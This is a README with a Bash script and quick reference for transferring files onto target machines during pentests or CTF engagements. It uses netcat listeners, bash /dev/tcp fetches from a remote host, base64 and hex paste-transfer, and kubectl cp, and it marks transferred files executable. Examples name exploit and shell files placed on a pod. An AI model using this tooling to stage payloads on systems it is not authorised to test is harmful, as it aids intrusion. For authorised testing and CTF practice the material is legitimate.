# 🛰️ xfer — File Transfer Toolkit .. 

A unified Bash script for transferring files between machines, pods, and environments during pentests or CTF engagements.

---

## 📁 Project Structure

```text
xfer/
├── xfer.sh          # Main unified script
├── README.md        # This file
```

---

## 🔧 xfer.sh

```bash
#!/usr/bin/env bash

set -euo pipefail

# ── Colors ────────────────────────────────────────────────────────────────────
RED=$(tput setaf 1 2>/dev/null || true)
GRN=$(tput setaf 2 2>/dev/null || true)
YEL=$(tput setaf 3 2>/dev/null || true)
RST=$(tput sgr0 2>/dev/null || true)

ok()   { echo "[${GRN}+${RST}] $*"; }
warn() { echo "[${YEL}!${RST}] $*"; }
err()  { echo "[${RED}ERR${RST}] $*" >&2; }

# ── Usage ─────────────────────────────────────────────────────────────────────
usage() {
  cat <<EOF
Usage:
  $(basename "$0") <command> [args...]

Commands:
  send           <file> <target_ip> [port=8000]
  receive        <source_ip> <port> <output_file>
  base64-encode  <file>
  base64-decode  (reads from stdin)
  hex-encode     <file>
  hex-decode     (reads from stdin)
  kubectl-cp     <file> <pod> <namespace> <dest_path>
  rsync          <source> <user@host:/dest>

Examples:
  $(basename "$0") send payload.bin 10.10.14.5 9000
  $(basename "$0") receive 10.10.14.5 9000 output.bin
  $(basename "$0") base64-encode exploit.bin
  $(basename "$0") base64-decode < encoded.b64
  $(basename "$0") hex-encode exploit.bin
  $(basename "$0") hex-decode < encoded.hex
  $(basename "$0") kubectl-cp ./shell.sh wordpress-pod default /tmp
  $(basename "$0") rsync ./data/ user@10.10.14.5:/backup/
EOF
}

# ── Commands ──────────────────────────────────────────────────────────────────
cmd_send() {
  local file="$1" ip="$2" port="${3:-8000}"
  [[ -f "$file" ]] || { err "File not found: $file"; exit 1; }
  ok "Serving '$file' → TCP $ip:$port (waiting for connection...)"
  nc -lvnp "$port" < "$file"
}

cmd_receive() {
  local host="$1" port="$2" out="$3"
  ok "Connecting to $host:$port → saving to '$out'..."
  exec 3<>/dev/tcp/"$host"/"$port"
  cat <&3 > "$out"
  exec 3>&-
  chmod +x "$out" 2>/dev/null || true
  ok "Saved '$out'."
}

cmd_base64_encode() {
  local file="$1"
  [[ -f "$file" ]] || { err "File not found: $file"; exit 1; }
  ok "Base64 encoding '$file':"
  base64 "$file"
}

cmd_base64_decode() {
  local out="decoded_file"
  warn "Paste base64 content, then press Ctrl+D:"
  base64 -d > "$out"
  chmod +x "$out" 2>/dev/null || true
  ok "Decoded → '$out'"
}

cmd_hex_encode() {
  local file="$1"
  [[ -f "$file" ]] || { err "File not found: $file"; exit 1; }
  ok "Hex encoding '$file':"
  xxd -p "$file"
}

cmd_hex_decode() {
  local out="decoded_file"
  warn "Paste hex content, then press Ctrl+D:"
  xxd -r -p > "$out"
  chmod +x "$out" 2>/dev/null || true
  ok "Decoded → '$out'"
}

cmd_kubectl_cp() {
  local file="$1" pod="$2" ns="$3" dest="$4"
  [[ -f "$file" ]] || { err "File not found: $file"; exit 1; }
  ok "Copying '$file' → pod '$pod' ($ns) : $dest"
  kubectl cp "$file" "$ns/$pod:$dest"
  kubectl exec -n "$ns" "$pod" -- chmod +x "$dest/$(basename "$file")"
  ok "Done."
}

cmd_rsync() {
  local src="$1" dest="$2"
  ok "Rsync: '$src' → '$dest'"
  rsync -aHAXxv \
    --numeric-ids \
    --delete \
    --progress \
    -e "ssh -T -o Compression=no -x" \
    "$src" "$dest"
}

# ── Main ──────────────────────────────────────────────────────────────────────
[[ $# -lt 1 ]] && usage && exit 1

CMD="$1"; shift

case "$CMD" in
  send)            [[ $# -lt 2 ]] && usage && exit 1; cmd_send "$@" ;;
  receive)         [[ $# -lt 3 ]] && usage && exit 1; cmd_receive "$@" ;;
  base64-encode)   [[ $# -ne 1 ]] && usage && exit 1; cmd_base64_encode "$1" ;;
  base64-decode)   cmd_base64_decode ;;
  hex-encode)      [[ $# -ne 1 ]] && usage && exit 1; cmd_hex_encode "$1" ;;
  hex-decode)      cmd_hex_decode ;;
  kubectl-cp)      [[ $# -ne 4 ]] && usage && exit 1; cmd_kubectl_cp "$@" ;;
  rsync)           [[ $# -ne 2 ]] && usage && exit 1; cmd_rsync "$@" ;;
  -h|--help|help)  usage ;;
  *)               err "Unknown command: $CMD"; usage; exit 1 ;;
esac
```

---

## 📋 Quick Reference

### Netcat (send/receive)

```bash
# Sender
nc -lvnp 8000 < file.bin

# Receiver
exec 3<>/dev/tcp/SENDER_IP/8000
cat <&3 > file.bin
```

### Base64 (copy/paste friendly)

```bash
# Encode
base64 file.bin > file.b64

# Decode (on target)
base64 -d file.b64 > file.bin && chmod +x file.bin
```

### Hex (xxd)

```bash
# Encode
xxd -p file.bin > file.hex

# Decode (on target)
xxd -r -p file.hex > file.bin && chmod +x file.bin
```

### Python HTTP server

```bash
# Host
python3 -m http.server 8000

# Fetch (bash only, no curl/wget needed)
exec 3<>/dev/tcp/HOST_IP/8000
printf 'GET /file.bin HTTP/1.0\r\n\r\n' >&3
tail -c +<offset> <&3 > file.bin
```

### kubectl

```bash
kubectl cp ./file.bin default/wordpress-pod:/tmp/file.bin
kubectl exec -it wordpress-pod -- chmod +x /tmp/file.bin
```

### rsync over SSH

```bash
# -a  archive (recursive + preserve perms/times/owner/symlinks)
# -H  preserve hard links
# -A  preserve ACLs
# -X  preserve extended attributes
# -x  don't cross filesystem boundaries
# -v  verbose
# --numeric-ids  skip uid/gid name mapping
# --delete       remove files on dest not in source
# --progress     show transfer progress
# -e  custom SSH: no compression, no X11, no pseudo-tty

rsync -aHAXxv \
  --numeric-ids \
  --delete \
  --progress \
  -e "ssh -T -o Compression=no -x" \
  user@source:/src_dir/ /dest_dir/
```

> **Note:** The old `arcfour` cipher has been removed from modern OpenSSH. Drop `-c arcfour` — the default ciphers (e.g. `chacha20-poly1305`) are fast and universally supported.

---

## 🚀 Install

```bash
chmod +x xfer.sh
sudo mv xfer.sh /usr/local/bin/xfer
```

---

## 💡 Tips

| Scenario | Recommended Method |
|---|---|
| No tools on target | `/dev/tcp` + bash |
| Binary, no network | base64 or hex encode → paste |
| Kubernetes pod | `kubectl cp` |
| Large directory sync | `rsync` over SSH |
| Quick file share | `python3 -m http.server` |
